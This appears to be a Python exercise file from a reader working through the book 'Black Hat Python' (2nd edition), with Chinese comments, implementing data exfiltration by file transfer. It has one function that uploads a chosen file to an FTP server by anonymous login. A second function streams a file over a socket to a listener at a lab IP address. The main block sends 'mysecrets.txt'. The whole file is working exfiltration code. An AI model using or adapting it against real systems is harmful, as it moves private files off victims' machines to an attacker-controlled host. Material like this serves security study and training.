#!/usr/bin/env python
# encoding: utf-8
"""
@file: transmit_exfil.py
@time: 2022/5/26 21:02
@project: black-hat-python-2ed
@desc: P171 基于文件传输的数据渗透
"""
import ftplib
import os.path
import socket

import win32file


def plain_ftp(docpath, server="192.168.56.101"):
    ftp = ftplib.FTP(server)
    # 登录FTP服务器
    ftp.login("anonymous", "anon@example.com")
    # 定位目标
    ftp.cwd('/pub/')
    # 将文件写入目标目录
    ftp.storbinary("STOR " + os.path.basename(docpath), open(docpath, "rb"), 1024)
    ftp.quit()


def transmit(document_path):
    client = socket.socket()
    client.connect(("192.168.56.1", 10000))
    with open(document_path, 'rb') as f:
        # 传输文件
        win32file.TransmitFile(client,
                               win32file._get_osfhandle(f.fileno()),
                               0, 0, None, 0, b'', b'')


if __name__ == '__main__':
    transmit('mysecrets.txt')
